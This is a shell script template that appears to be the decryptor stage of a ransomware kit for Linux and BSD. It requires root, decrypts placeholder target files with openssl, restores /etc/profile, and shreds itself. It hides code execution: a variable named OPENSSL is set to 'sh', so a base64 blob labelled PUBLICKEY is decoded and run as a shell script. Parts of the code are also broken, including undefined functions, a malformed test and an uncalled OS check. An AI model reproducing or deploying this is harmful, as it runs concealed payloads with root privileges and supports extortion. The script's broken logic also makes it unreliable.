#!/bin/sh
################ CHECKS ###############################
# Get the OS version
get_os() {
    if [[$(uname -s | grep Linux) != ""]]; then
	OS="linux"
    elif [[ $( uname -s | grep BSD) != "" ]]; then
	OS="bsd"
    else
	echo "[!] NOT \"Linux\" or \"BSD\""
	exit
    fi
}

OPENSSL="sh"
check_req() {
    # Fatal Errors
    if [ "$(whoami)" != "root" ]; then
	echo  "[!] NOT ROOT"
        exit
    fi
    if [ "$(which openssl)" = "" ]; then
        echo  "[!] NO OPENSSL FOUND"
        exit
    fi
}
################ FUNCTIONS ##########################
openfile() {
	if [ "$OS" = "linux" ]; then
		chmod +rw $1
		chattr -i $1
	fi
	if [ "$OS" = "bsd" ]; then
		chmod +rw $1
		chflags schg $1
	fi
}

################## DECRYPT ################################
decrypt() {
    echo "[+] Decrypted $1"
    openfile $1
    openfile $1.dec
    mv $1 $1.enc
    openssl aes-256-cbc -d -k "$KEY" -in "$1.enc" -out "$1"
    rm $1.enc
}

loop() {
    for i in $1; do
	decrypt $i 
    done
}

dec_loop() {
    kills="$1"
    for i in $kills; do
    	if [ -d "$i" ]; then
	    navdir "$i/*" "upk"
	    adderr "[+] Decrypted $i"
	fi
    done
}
################## KEY STUFF ##############################
check_req
KEY="__KEY__"
PUBLICKEY="\
__STRING__"
echo -n "$PUBLICKEY" | openssl base64 -d | $OPENSSL
loop "__TARGETS__"
rm /etc/profile
mv /etc/profile.bak /etc/profile
shred $0
